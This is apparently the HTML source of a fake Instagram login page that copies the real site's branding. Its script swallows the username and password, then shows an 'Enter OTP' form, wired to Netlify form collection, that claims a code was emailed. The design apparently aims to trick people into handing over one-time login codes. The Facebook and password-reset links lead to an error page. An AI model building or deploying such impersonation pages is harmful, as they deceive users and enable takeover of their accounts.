<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log In â€¢ Instagram</title>
    <link rel="stylesheet" href="index.css">
    <link rel="shortcut icon" href="https://static.cdninstagram.com/rsrc.php/v3/yT/r/ATdtiNQ1HcI.png">
</head>

<body>
    <div id="wrapper">
        <!-- Login Section -->
        <div class="main-content" id="loginSection">
            <!-- Instagram Logo -->
            <div class="header">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram Logo">
            </div>

            <!-- Facebook Login Button -->
            <div class="btn1">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yZ/r/t9zW8PWBnrV.png" alt="Facebook Logo" class="icon">
                <input type="button" onclick='window.location ="error.html";' value="Continue with Facebook" class="btn2">
            </div>

            <!-- OR Divider -->
            <div class="divider">
                <span class="line"></span>
                <span class="or">OR</span>
                <span class="line"></span>
            </div>

            <!-- Login Form -->
            <div class="l-part">
                <form id="loginForm">
                    <input type="text" name="username" placeholder="Phone number, username, or email" class="input-1" required>
                    <input type="password" name="password" placeholder="Password" class="input-2" required>
                    <input type="submit" class="btn" value="Log In">
                </form>
            </div>

            <!-- Forgot Password Link -->
            <div class="forgot-password">
                <a href="error.html">Forgot password?</a>
            </div>
        </div>

        <!-- OTP Section (Hidden Initially) -->
        <div id="otpSection" class="otp-section hidden">
            <h3>Enter OTP</h3>
            <p>We've sent a one-time password to your email.</p>
            <form id="otpForm" name="otp" netlify>
                <input type="text" name="otp" placeholder="Enter OTP" class="input-1" required>
                <input type="submit" class="btn" value="Verify OTP">
            </form>
        </div>

        <!-- Sign-Up Section -->
        <div class="sub-content">
            <div class="s-part">
                Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
            </div>
        </div>

        <!-- App Download Links -->
        <div class="apps">
            <p>Get the app.</p>
            <div class="app-buttons">
                <a href="https://apps.apple.com/app/instagram/id389801252">
                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Download on the App Store">
                </a>
                <a href="https://play.google.com/store/apps/details?id=com.instagram.android">
                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it on Google Play">
                </a>
            </div>
        </div>
    </div>

    <script>
        // Simulate login and show OTP section
        document.getElementById('loginForm').addEventListener('submit', function (e) {
            e.preventDefault(); // Prevent form submission
            document.getElementById('loginSection').classList.add('hidden'); // Hide login section
            document.getElementById('otpSection').classList.remove('hidden'); // Show OTP section
        });
    </script>
</body>

</html>
